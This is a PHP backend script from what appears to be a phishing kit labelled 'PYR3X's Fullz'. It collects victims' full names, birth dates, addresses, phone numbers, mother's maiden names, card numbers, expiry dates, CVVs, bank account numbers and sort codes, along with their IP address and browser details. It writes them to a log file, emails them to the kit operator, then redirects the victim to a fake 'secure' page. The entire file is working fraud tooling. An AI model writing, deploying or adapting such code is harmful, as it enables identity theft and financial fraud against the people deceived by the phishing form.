<?php

error_reporting(0);

session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($ip);

$host = gethostbyaddr($ip);

if(!empty($_POST['ccname']))  {
$ccname = $_POST['ccname'];
}

if(!empty($_POST['county']))  {
$county = $_POST['county'];
}

if(!empty($_POST['acct']))  {
$acct = $_POST['acct'];
}

if(!empty($_POST['sort']))  {
$sort = $_POST['sort'];
}

if(!empty($_POST['fname']))  {
$fname = $_POST['fname'];
}

if(!empty($_POST['day']))  {
$day = $_POST['day'];
}

if(!empty($_POST['month']))  {
$month = $_POST['month'];
}

if(!empty($_POST['year']))  {
$year = $_POST['year'];
}

if(!empty($_POST['address']))  {
$address = $_POST['address'];
}

if(!empty($_POST['city']))  {
$city = $_POST['city'];
}

if(!empty($_POST['postcode']))  {
$postcode = $_POST['postcode'];
}

if(!empty($_POST['ccnum']))  {
$ccnum = $_POST['ccnum'];
}

if(!empty($_POST['expiry']))  {
$expiry = $_POST['expiry'];
}

if(!empty($_POST['cvv']))  {
$cvv = $_POST['cvv'];
}

if(!empty($_POST['phone']))  {
$phone = $_POST['phone'];
}

if(!empty($_POST['mmn']))  {
$mmn = $_POST['mmn'];
}

require "includes/userinfo.php";
require "includes/my_email.php";
date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i");
$agent = $_SERVER['HTTP_USER_AGENT'];
$from = $From_Address;
$to = $Your_Email;

$msg = "------------ PYR3X's Fullz ------------\n";
$msg .= "Full name : ".$fname."\n";
$msg .= "Date of birth : ".$day."/".$month. "/".$year. "\n";
$msg .= "Address : ".$address."\n";
$msg .= "City : ".$city."\n";
$msg .= "County : ".$county."\n";
$msg .= "Post Code : ".$postcode."\n";
$msg .= "Memorable Name : ".$mmn."\n";
$msg .= "Phone Number : ".$phone."\n";
$msg .= "------------ Fullz ------------\n";
$msg .= "Card Holder's Name : ".$ccname."\n";
$msg .= "Card Number : ".$ccnum."\n";
$msg .= "Expiry Date : ".$expiry."\n";
$msg .= "CVV : ".$cvv."\n";
$msg .= "Account Number : ".$acct."\n";
$msg .= "Sort Code : ".$sort."\n";
$msg .= "------------ IP INFO ------------\n";
$msg .= "Submitted by : $ip ($host)\n";
$msg .= "UserAgent : $agent\n";
$msg .= "Browser : $user_browser\n";
$msg .= "OS : $user_os\n";
$msg .= "------------ PYR3X's Fullz ------------\n";

$subject = "Fresh PYR3X Fullz from " . $_SERVER['REMOTE_ADDR'];
$headers = "Sent from: " . $from;

if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/results.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/results.txt","a");
	fwrite($file,$msg);
	fclose($file);
	}
}
if($Send_Log==1) {
	mail($to,$subject,$msg,$headers);
	}

header("Location: redirect.php?&sessionid=$hash&securessl=true");


?>
